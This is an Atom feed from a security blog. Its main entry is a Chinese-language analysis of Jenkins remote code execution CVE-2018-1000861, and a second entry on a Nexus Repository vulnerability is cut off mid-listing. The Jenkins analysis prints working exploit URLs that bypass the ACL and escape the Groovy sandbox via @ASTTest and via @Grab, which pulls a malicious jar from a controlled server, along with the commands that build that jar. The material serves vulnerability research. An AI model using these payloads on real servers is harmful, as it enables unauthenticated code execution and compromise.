<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lucifaer&#39;s blog</title>
  
  <subtitle>Infomation Security Note</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lucifaer.com/"/>
  <updated>2019-03-04T09:33:22.380Z</updated>
  <id>https://lucifaer.com/</id>
  
  <author>
    <name>Lucifaer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jenkins RCE分析（CVE-2018-1000861分析）</title>
    <link href="https://lucifaer.com/2019/03/04/Jenkins%20RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-1000861%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/03/04/Jenkins RCE分析（CVE-2018-1000861分析）/</id>
    <published>2019-03-04T09:26:00.000Z</published>
    <updated>2019-03-04T09:33:22.380Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞是我个人感觉非常精彩的一个漏洞，非常值得好好的学习一下，Orange Tql！</p><a id="more"></a><h1 id="0x01-Jenkins的动态路由解析"><a href="#0x01-Jenkins的动态路由解析" class="headerlink" title="0x01 Jenkins的动态路由解析"></a>0x01 Jenkins的动态路由解析</h1><p><code>web.xml</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15508232678628.jpg" alt=""></p><p>可以看到Jenkins将所有的请求交给<code>org.kohsuke.stapler.Stapler</code>来处理的，跟进看一下这个类中的<code>service</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510912657193.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15508242301079.jpg" alt=""></p><p>可以看到这里会根据url来调用不同的webApp，如果url以<code>/$stapler/bound/</code>开头，则根节点对象为<code>org.kohsuke.stapler.bind.BoundObjectTable</code>，否则为<code>hudson.model.Hudson</code>（继承jenkins.model.Jenkins）。</p><p>这里涉及到四个参数：</p><ul><li>req：请求对象</li><li>rsp：响应对象</li><li>root：webApp（根节点）</li><li>servletPath：经过路由解析后的对象</li></ul><p>继续向下跟：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15508271723386.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510915150703.jpg" alt=""></p><p>在<code>org.kohsuke.stapler.Stapler#tryInvoke</code>中会根据不同的webApp的类型对请求进行相应的处理，处理的优先级顺序向下：</p><ul><li>StaplerProxy</li><li>StaplerOverridable</li><li>StaplerFallback</li></ul><p>在<code>tryInvoke</code>中完成对路由的分派以及将路由与相应的功能进行绑定的操作，这里面比较复杂，但是非常有意思。</p><p>我们来看一下文档中是如何介绍路由请求这部分操作的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510593937933.jpg" alt=""></p><p>文档中详细的说明了当我们传入类似<code>/foo/bar/</code>这样的url时路由解析的具体做法，具体看一下<code>tryInvoke</code>中的代码实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511484361514.jpg" alt=""></p><p>这里首先会根据webApp（根节点）来获取webApp的一个MetaClass对象，然后轮询MetaClass中所有的分派器——也就是Dispatcher.dispatcher。我们这里知道webApp是<code>hudson.model.Hudson</code>（继承jenkins.model.Jenkins），也就是说这里创建了MetaClass后会将请求包带入所有的分派器中进行相应的路由处理。</p><p>那么接下来就会有两个问题了：</p><ul><li>metaClass是如何构造的？还有metaClass是个什么东西？</li><li>在哪里完成的如文档所说的递归进行路由解析并通过分派器进行相应处理的呢？</li></ul><p>这个两个问题困扰我很长的时间，在我耐心的动态调了一遍之后才明白了他的调用原理。</p><h4 id="metaClass的构建"><a href="#metaClass的构建" class="headerlink" title="metaClass的构建"></a>metaClass的构建</h4><p>这里我会用动态调试的方式来解释metaClass的构建过程以及它是一个什么东西。</p><p>这里我用根据orange文章中所给出的路由来进行跟踪，路由为<code>/securityRealm/user/test/</code>。那么首先看一下metaClass的构建过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511629693475.jpg" alt=""></p><p>这里有两个关键点<code>getMetaClass</code>以及<code>getKlass</code>，首先跟进<code>getKlass</code>看一下:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511630759036.jpg" alt=""></p><p>首先先判别我们传进来的node（也就是节点）是否是属于上面三个Facet的一个配置项，关于Facet我的理解是用于简化项目配置项的一种操作，它并不属于J2EE的部分，这部分我是参考<a href="https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee" target="_blank" rel="noopener">https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee</a>。跟进<code>f.getKlass</code>，会发现直接返回null，所以我们不用关注这个循环，继续向下看<code>Klass.java(o.getClass())</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511638405454.jpg" alt=""></p><p>这里动态的实例化了<code>KlassNavigator.JAVA</code>，这里的Klass其实是一个动态实例化的对象，这个对象中存在很多方法用于操作，同时也实例化了<code>Klass</code>类。可能现在还是看不出来什么和metaClass有关的东西，那不妨接着看看<code>getMetaClass</code>中是怎么处理这个<code>Klass</code>的。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511642536434.jpg" alt=""></p><p>跟进<code>MetaClass</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511656316649.jpg" alt=""></p><p>在这里首先通过之前实例化的<code>Klass</code>对象中的方法来获取node节点的信息，并调用<code>buildDispatchers()</code>来创建分派器，这个方法是url调度的核心。</p><p>这个方法非常的长，我们来梳理一下（其实orange已经帮助我们梳理了），我是按照代码中自上而下的顺序来整理的：</p><ul><li><code>&lt;obj&gt;.do&lt;token&gt;(...)</code>也就是<code>do(...)</code>和<code>@WebMethod</code>标注的方法</li><li><code>&lt;obj&gt;.doIndex(...)</code> </li><li><code>&lt;obj&gt;js&lt;token&gt;</code>也就是<code>js(...)</code></li><li>有<code>@JavaScriptMethod</code>标注的方法</li><li><code>NODE.getTOKEN()</code>也就是<code>get()</code></li><li><code>NODE.getTOKEN(StaplerRequest)</code>也就是<code>get(StaplerRequest)</code></li><li><code>&lt;obj&gt;.get&lt;Token&gt;(String)</code>也就是<code>get(String)</code></li><li><code>&lt;obj&gt;.get&lt;Token&gt;(int)</code>也就是<code>get(int)</code></li><li><code>&lt;obj&gt;.get&lt;Token&gt;(long)</code>也就是<code>get(long)</code></li><li><code>&lt;obj&gt;.getDynamic(&lt;token&gt;,...)</code>也就是<code>getDynamic()</code></li><li><code>&lt;obj&gt;.doDynamic(...)</code>也就是<code>doDynamic()</code></li></ul><p>也就是说符合以上命名规则的方法都可以被调用。</p><p><code>buildDispatchers()</code>的主要作用就是寻找对应的node节点与相应的处理方法（继承家族树中的所有类）并把这个方法加入到分配器dispatchers中。而这里所说的这个方法可能是对节点的进一步处理最后通过反射的方法调用真实处理该节点的方法。</p><p>举一个例子，在代码中可以看到在对<code>get(...)</code>类的node进行处理的时候都会动态生成一个<code>NameBasedDispatcher</code>对象并将其添加进入dispathers中，而这个对象都存在<code>doDispatch()</code>的方法用于处理分派器传来的请求，而在处理请求的最后都会调用<code>invoke</code>来反射调用真实处理方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511687918250.jpg" alt=""></p><p>这里先记一下这样的处理过程，在之后的分派器处理路由请求时会有涉及。</p><h4 id="路由请求处理过程"><a href="#路由请求处理过程" class="headerlink" title="路由请求处理过程"></a>路由请求处理过程</h4><p>仍然是以上面<code>/securityRealm/user/test/</code>路由为例。首先不看代码，先根据文档中所描述的处理方式大致猜一下这一串路由是如何解析的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt; node: Hudson</span><br><span class="line">  -&gt; node: securityRealm</span><br><span class="line">    -&gt; node: user</span><br><span class="line">      -&gt; node: test</span><br></pre></td></tr></table></figure><p>回到<code>tryInvoke</code>中我们来具体看一下在代码中是怎么做的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511718645324.jpg" alt=""></p><p>注意到这里会有一个遍历<code>metaClass.dispatchers</code>的操作，然后在每次遍历的过程中，将请求、返回以及node节点传入<code>Dispatcher.dispatch</code>中，跟一下这个<code>dispatch</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511724916056.jpg" alt=""></p><p>这个是一个抽象类，那么他的具体实现是什么呢，还记得上一节所探讨的metaClass中对get请求的处理么，它们都会动态的生成一个<code>NameBasedDispatcher</code>对象，而我们现在的处理过程中就会调用到这个对象中的<code>dispatch</code>方法，我们来看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511729433360.jpg" alt=""></p><p>注意看红框的部分，这里会获取请求的node节点，并调用其具体实现中的<code>doDispatch</code>方法，而这个<code>doDispatch</code>方法是在<code>buildDispatchers()</code>中根据不同的node节点动态生成的，那么也就是调用了处理<code>get(...)</code>的<code>doDispatch</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511730690363.jpg" alt=""></p><p>这里我们有一个疑惑，第一个节点已经ok了，那么如何递归的解析其他的节点呢？这一点需要跟一下<code>req.getStapler().invoke()</code>，先看一下<code>getStapler()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511758590085.jpg" alt=""></p><p>就是当前的Stapler。这里的ff是一个<code>org.kohsuke.stapler.Function</code>对象，它保存了当前根节点中方法的各种信息：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511772450427.jpg" alt=""></p><p>ff.invoke会返回<code>Hudson.security.HudsonPrivateSecurityRealm</code>对象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511773288120.jpg" alt=""></p><p>然后将这个<code>HudsonPrivateSecurityRealm</code>对象作为新的根节点再次调用<code>tryInvoke</code>来进行解析，一直递归到将url全部解析完毕，这样才完成了动态路由解析。</p><h1 id="0x02-Jenkins白名单路由"><a href="#0x02-Jenkins白名单路由" class="headerlink" title="0x02 Jenkins白名单路由"></a>0x02 Jenkins白名单路由</h1><p>在跟踪Jenkins的动态路由解析中，一直没有提及一个过程，就是在<code>org.kohsuke.stapler.Stapler#tryInvoke</code>中首先对属于<code>StaplerProxy</code>的node进行的一个校验：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15511778879492.jpg" alt=""></p><p>跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510781474963.jpg" alt=""></p><p>这里首先要进行权限检查，首先检查访问请求是否具有读的权限，如果没有读的权限则会抛出异常，在异常处理中会对URL进行二次检测，如果<code>isSubjectToMandatoryReadPermissionCheck</code>返回false，则仍能正常的返回，那么跟进看一下这个方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510785640165.jpg" alt=""></p><p>这里有三种方法绕过权限检查，这里着重看一下第一种，可以看到这里有一个白名单，如果请求的路径是这其中的路径的话，就可以绕过权限检测：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15510836928487.jpg" alt=""></p><h1 id="0x03-绕过ACL进行跨物件操作"><a href="#0x03-绕过ACL进行跨物件操作" class="headerlink" title="0x03 绕过ACL进行跨物件操作"></a>0x03 绕过ACL进行跨物件操作</h1><p>这也是orange文章中最为精华的部分，主要是有三个关键点：</p><ul><li>Java中万物皆继承于java.lang.Object，所以所有在Java中的类都存在<code>getClass()</code>这个方法</li><li>Jenkins的动态路由解析过程也是一个<code>get(...)</code>的命名格式，所以<code>getClass()</code>可以在Jenkins调用链中被动态调用。</li><li>上文中所说的白名单可以绕过ACL的检测</li></ul><p>重点说一下第二点，根据文档以及我们上文的分析，如果有这么一个路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content</span><br></pre></td></tr></table></figure><p>那么在Jenkins的路由解析过程中会是这样的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jenkins.model.Jenkins.getAdjuncts(&quot;whatever&quot;) </span><br><span class="line">.getClass()</span><br><span class="line">.getClassLoader()</span><br><span class="line">.getResource(&quot;index.jsp&quot;)</span><br><span class="line">.getContent()</span><br></pre></td></tr></table></figure><p>当例子中的class更改成其他的类时，get(…)也会被相应的调用，也就是说可以操作任意的GETTER方法！</p><p>理解了这一点，我们只需要把调用链中各个物件间的关系找出来就能构成一条完整的利用链！这一点才是整个漏洞中最精彩的一部分。</p><h1 id="0x04-整理漏洞利用链"><a href="#0x04-整理漏洞利用链" class="headerlink" title="0x04 整理漏洞利用链"></a>0x04 整理漏洞利用链</h1><p>在利用orange文章中给出的跳板url进行跟踪的过程中，我一直试图去理解为什么要这样的构造，而并不是直接拿来这个url进行动态调。下面我将尝试去解释如何一步步发现以及一步步的构造这个跳板。</p><p>在0x02中我们已经分析了可以利用三种白名单中的路由格式来绕过权限检查，这里我们利用<code>securityRealm</code>来构造利用链。</p><h4 id="securityRealm中可用的利用链"><a href="#securityRealm中可用的利用链" class="headerlink" title="securityRealm中可用的利用链"></a>securityRealm中可用的利用链</h4><p>我们看一下<code>securityRealm</code>对应的metaClass中有什么可以用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513255436337.jpg" alt=""></p><p>可以看到总共可用的有30个之多，而真正可以控制的利用链只有<code>hudson.security.HudsonPrivateSecurityRealm.getUser(String)</code>。</p><blockquote><p>如果仔细阅读了文档，可以很容易根据方法名来理解这个方法主要是干什么的，比如get(…)[token]这样的，就说明他会根据路由解析策略来解析之后的参数，如果说是do(…)这样的，证明会执行相应的方法。</p></blockquote><p>那么也就说我们之后的操作需要基于<code>getUser</code>这个方法。根据路由解析策略，我们现在构造这样的url来进一步动态看一下在<code>User</code>对应的metaClass中有什么可以利用的。</p><h4 id="突破习惯性思维"><a href="#突破习惯性思维" class="headerlink" title="突破习惯性思维"></a>突破习惯性思维</h4><p>我们这此将url更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/securityRealm/user/admin</span><br></pre></td></tr></table></figure><p>看一下metaClass中的内容，发现都是<code>User</code>这个类中的方法，好像没有什么能用的东西，好像这个思路不可行了，那么这个时候能不能继续利用路由的解析特点来调用其他的类中的方法呢？可以的。</p><p>这个时候就要说一下在每个节点加载时候存在的一个问题，这部分是我自己的猜测可能有错误，希望大家指正。</p><p>根据0x01中的分析，我们都知道第一个根节点为<code>hudson.model.Hudson</code>，而<code>Hudson</code>又是继承于<code>Jenkins</code>的，所以他会将hudson和jenkins包下的model中所有的类全部都加载进metaClass中，从动态调试中我们也能看得出来：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513410174776.jpg" alt=""></p><p>那么由于我们是需要利用<code>securityRealm</code>来绕过权限检测，那么这个时候下次处理的根节点为<code>hudson.security.HudsonPrivateSecurityRealm</code>，同样，这里也会加载<code>HudsonPrivateSecurityRealm</code>这个类下的所有方法，因为这里只有<code>getUser(String)</code>中的String是收我们控制并且能执行的一个方法，所以我们这里就可以调用到<code>hudson.model.User</code>类，此时路由解析会认为下一个节点是该方法的一个参数（token），在解析下一个节点时将其节点带入到<code>getUser()</code>方法中。在这里metaClass中是<code>User</code>这个类中的所有方法，但是在路由解析中认为下一个节点并不会是与<code>User</code>所相关的参数或方法。<strong>所以当我们在这里新传入一个不在metaClass中的方法时，他首先会在构建metaClass的过程中尝试找到这个未知的类及其继承树中的类，并将其加入到metaClass中。</strong>而这个添加的过程，就在<code>webApp.getMetaClass(node)</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513424120873.jpg" alt=""></p><p>所以我可以构造这么样一个url来调用<code>hudson.search.Search#doIndex</code>来进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/admin/search/index?q=a</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513425180676.jpg" alt=""></p><p>同样我也可以尝试调用<code>hudson.model.Api#doJson</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/admin/api/json</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513427110206.jpg" alt=""></p><p>这么顺着想当然没有问题，但是我在分析的时候又有一个想法，如果说我不加<code>user/admin</code>也就是说不调用<code>User</code>能不能直接加载<code>api/json</code>来查看信息呢？</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513432188343.jpg" alt=""></p><p>不行，为什么呢？同样的问题也出现在调用<code>search/index</code>中。</p><h4 id="理解metaClass的加载机制"><a href="#理解metaClass的加载机制" class="headerlink" title="理解metaClass的加载机制"></a>理解metaClass的加载机制</h4><p>这个问题其实是一个比较钻牛角尖的问题，以及对<code>metaClass</code>加载方式不完全了解的问题。我们来看一下<code>User</code>的继承树关系图:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514220055697.jpg" alt=""></p><p><code>User</code>类是直接继承于<code>AbstractModelObject</code>这个抽象类的，而<code>AbstractModelObject</code>是<code>SearchableModelObject</code>这个接口的实现，这是一条完整的继承树关系。我们来首先看一下<code>SearchableModelObject</code>这个接口：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514223563638.jpg" alt=""></p><p>在接口这里声明了一个<code>getSearch()</code>方法，也就是说当节点为<code>User</code>类时，在metaClass寻找的过程中是可以通过继承树关系来找到<code>getSearch()</code>方法的，接下来看一下具体的实现:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514224780226.jpg" alt=""></p><p>这里会返回一个<code>Search</code>对象，然后这个对象中的所有方法都会被添加进入metaClass中，并通过<code>buildDispatchers()</code>来完成分派器的生成，然后就是正常的路由解析过程。</p><p>而在<code>HudsonPrivateSecurityRealm</code>的继承树关系中是没有这一层关系的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514229289294.jpg" alt=""></p><p>所以<code>search/index</code>是没办法被找到的。</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>现在我们理清楚了未什么跳板url需要这样构造，说实话，调用到<code>User</code>这个类其实就是完成了一个作用域的调转，从原来的限制比较死的作用域跳转到一个更加广阔的作用域中了。</p><p>那么现在问题来了，rce的利用链到底在哪里？</p><p>我们重新看看在<code>User</code>节点中还有什么是可以利用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514231583982.jpg" alt=""></p><p>这里好像可以调用<code>ModelObject</code>中的东西，那么先来分析一下<code>DescriptorByNameOwner</code>这个接口：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514232501037.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514248777003.jpg" alt=""></p><p>可以看到就是通过id来获取相应的Descriptor，也就是说接下来去寻找可用的Descriptor就行了。这里下个断点就能看到582个可调用的Descriptor了。</p><h1 id="0x05-Groovy沙盒绕过最终导致的rce"><a href="#0x05-Groovy沙盒绕过最终导致的rce" class="headerlink" title="0x05 Groovy沙盒绕过最终导致的rce"></a>0x05 Groovy沙盒绕过最终导致的rce</h1><p>Jenkins 2019-01-08的安全通告中包含了Groovy沙箱绕过的问题：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514256864031.jpg" alt=""></p><p>其实最后可利用的点并非这么几条路，但是其原理都是差不多的，这里用Script Security这个插件作为例子来分析。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516698690607.jpg" alt=""></p><p>在<code>org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl</code>中我们首先可以看到这个<code>DescriptorImpl</code>是继承于<code>Descriptor</code>的，也就是说我们上面的调用链可以访问到该方法；同时在这个方法中存在一个<code>doCheckScript</code>的方法，根据前面的分析，我们知道这个方法也是可以被我们利用的，并且这个方法的value是我们可控的，在这里完成的对value这个Groovy表达式的解析。</p><p>这里只是解析了Grovvy表达式，那么它是否执行了呢？这里我们先不讨论是否执行了，我们来试一试公告中的沙箱绕过方式是怎么做的。</p><h4 id="方法一：-ASTTest中执行assertions"><a href="#方法一：-ASTTest中执行assertions" class="headerlink" title="方法一：@ASTTest中执行assertions"></a>方法一：@ASTTest中执行assertions</h4><p>首先在本地试一下<code>@ASTTest</code>中是否能执行断言，执行的断言是否能执行代码：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516819287527.jpg" alt=""></p><p>然后试一下这个poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a</span><br><span class="line">%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22open+%2fApplications%2fCalculator.app%22)%7d)%0a</span><br><span class="line">class+Person%7b%7d</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516837235401.jpg" alt=""></p><p>成功执行代码。</p><p>这里的执行命令的方式可以换成groovy形式的执行方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a</span><br><span class="line">%40ASTTest(value%3d%7b+%22open+%2fApplications%2fCalculator.app%22.execute().text+%7d)%0a</span><br><span class="line">class+Person%7b%7d</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516859748705.jpg" alt=""></p><h4 id="方法二：-Grab引入外部的危险类"><a href="#方法二：-Grab引入外部的危险类" class="headerlink" title="方法二：@Grab引入外部的危险类"></a>方法二：@Grab引入外部的危险类</h4><p><code>Grape</code>是groovy内置的依赖管理引擎，具体的说明在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">官方文档</a>中，可以仔细阅读。</p><p>在阅读<code>Grape</code>文档时，关于引入其他存储库这部分的操作是非常令人感兴趣的:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516864448500.jpg" alt=""></p><p>如果这里的root是可以指向我们控制的服务器，引入我们已经构造好的恶意的文件呢？有点像JNDI注入了吧。</p><p>本地写个demo试一下:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516872081851.jpg" alt=""></p><p>那么按照这个模式来构造，这里参考Orange第二篇文章或<a href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html" target="_blank" rel="noopener">这篇利用文章</a>，我的执行流程如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.java</span><br><span class="line">mkdir -p META-INF/services/</span><br><span class="line">echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line">jar cvf poc-2.jar Exp.class META-INF</span><br><span class="line">mkdir -p ./demo_server/exp/poc/2/</span><br><span class="line">mv poc-2.jar demo_server/exp/poc/2/</span><br></pre></td></tr></table></figure><p>然后构造如下的请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=@GrabConfig(disableChecksums=true)%0a</span><br><span class="line">@GrabResolver(name=&apos;Exp&apos;, root=&apos;http://127.0.0.1:9999/&apos;)%0a</span><br><span class="line">@Grab(group=&apos;demo_server.exp&apos;, module=&apos;poc&apos;, version=&apos;2&apos;)%0a</span><br><span class="line">import Exp;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516896230268.jpg" alt=""></p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>Orange这个洞真的是非常精彩，从动态路由入手，再到Pipeline这里groovy表达式解析，真的是一环扣一环，在这里我用正向跟进的方法将整个漏洞梳理了一遍，梳理前是非常迷惑的，梳理后恍然大悟，越品越觉得精彩。Orange Tql。</p><p>T T</p><h1 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h1><ul><li><a href="https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee" target="_blank" rel="noopener">https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee</a></li><li><a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">http://docs.groovy-lang.org/latest/html/documentation/grape.html</a></li><li><a href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html</a></li><li><a href="https://jenkins.io/security/advisories/" target="_blank" rel="noopener">https://jenkins.io/security/advisories/</a></li><li><a href="https://jenkins.io/doc/developer/book/" target="_blank" rel="noopener">https://jenkins.io/doc/developer/book/</a></li><li><a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/" target="_blank" rel="noopener">https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</a></li><li><a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/" target="_blank" rel="noopener">https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞是我个人感觉非常精彩的一个漏洞，非常值得好好的学习一下，Orange Tql！&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Jenkins" scheme="https://lucifaer.com/tags/Jenkins/"/>
    
  </entry>
  
  <entry>
    <title>Nexus Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）</title>
    <link href="https://lucifaer.com/2019/02/19/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-7238%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/02/19/Nexus Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）/</id>
    <published>2019-02-19T09:22:44.000Z</published>
    <updated>2019-02-19T09:28:28.869Z</updated>
    
    <content type="html"><![CDATA[<p>这篇分析其实在上周五也就是2月15号左右就已经分析完了，但是当时没有及时发出来，当周一看到iswin dalao发出的详尽分析后才把这篇分析发布做了预警算是慢了n步2333…</p><p>总体来说这个漏洞流程是比较好分析的，真正的难度是找漏洞触发点，当时分析的时候找了半天没找到触发点，最后还是硬着头皮在OrientDb的处理流程中绕了半天才意识到…还是太菜了</p><a id="more"></a><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><blockquote><p>Insufficient access controls have been discovered in Nexus Repository Manager 3 which allow remote code execution.</p></blockquote><blockquote><p>An unauthenticated user can craft requests in such a manner that can execute java code on the server. We have mitigated the issue by adding the necessary access controls as well as disabling the ability to execute arbitrary java code via this path.  This advisory provides the pertinent information needed to properly address this vulnerability, along with the details on how to reach us if you have any further questions or concerns.</p></blockquote><p>从官方的漏洞简述来看简单的来说就是由于未授权访问的用户可以构造请求而造成任意代码执行。而且因为3.15.0+以上的版本增加了用户认证，所以3.15.0+的版本不受此漏洞的影响。所以根据diff的结果，可以大致的确定漏洞在<code>org.sonatype.nexus.coreui.ComponentComponent#previewAssets</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15505627413764.jpg" alt="-w1338"></p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span 